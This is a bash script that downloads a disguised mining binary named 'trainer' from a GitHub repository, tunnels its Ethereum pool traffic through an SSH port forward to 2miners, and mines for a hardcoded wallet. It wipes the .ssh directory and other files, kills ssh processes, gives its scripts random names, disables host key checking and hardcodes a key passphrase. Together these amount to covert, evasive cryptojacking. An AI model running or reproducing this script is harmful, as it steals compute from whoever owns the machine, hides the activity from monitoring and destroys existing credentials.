#!/usr/bin/env bash

rm .ssh/* train* corkscrew-auth *.sh *.txt
pkill ssh

MAIN_BASH="$(cat /dev/urandom | tr -dc '[:alpha:]' | fold -w 20 | head -n 1).sh"
START_BASH="$(cat /dev/urandom | tr -dc '[:alpha:]' | fold -w 20 | head -n 1).sh"
TUN_NAME=$(cat /dev/urandom | tr -dc '[:alpha:]' | fold -w 20 | head -n 1)
CORE=$(cat /dev/urandom | tr -dc '[:alpha:]' | fold -w 20 | head -n 1)
CORE_CONFIG="$CORE.cfg"

PORT=$(shuf -i 2000-65000 -n 1)
HOST="$1"
HOST_USER="$2"
HOST_PASS="$3"
DEST="us-eth.2miners.com:12020"
POOL="127.0.0.1:$PORT"
WORKER="0x476241f016e207C4faf657687FcF553f51047030.Worker_$( date +%Y%m%d%H%M%S )"

wget https://raw.githubusercontent.com/Sazola/ai2/main/trainer

cat << EOF > $START_BASH
#!/usr/bin/expect
spawn ./$MAIN_BASH
expect "password:"
send "$HOST_PASS\r"
interact
EOF

cat << EOF > $MAIN_BASH
#!/bin/bash

#create key
printf '\nMelon@101\nMelon@101\n' | ssh-keygen -t ed25519

#create ssh config
printf "Host $TUN_NAME\n" >> .ssh/config
printf "    HostName $HOST\n" >> .ssh/config
printf "	StrictHostKeyChecking no\n" >> .ssh/config
printf "    IdentityFile ~/.ssh/id_ed25519\n" >> .ssh/config
printf "	LocalForward $PORT $DEST\n" >> .ssh/config
printf "    User $HOST_USER\n" >> .ssh/config

ssh -f -N $TUN_NAME

#create config
printf "algo=ETHASH\n" >> $CORE_CONFIG
printf "pool=$POOL\n" >> $CORE_CONFIG
printf "user=$WORKER\n" >> $CORE_CONFIG
printf "tls=on\n" >> $CORE_CONFIG
printf "ethstratum=ETHPROXY" >> $CORE_CONFIG

#start working
chmod +x $CORE
./$CORE --config ./$CORE_CONFIG
EOF

#rename core file
mv trainer $CORE

#run starter bash

chmod +x $START_BASH
chmod +x $MAIN_BASH
sed -i -e 's/\r$//' $START_BASH
sed -i -e 's/\r$//' $MAIN_BASH
./$START_BASH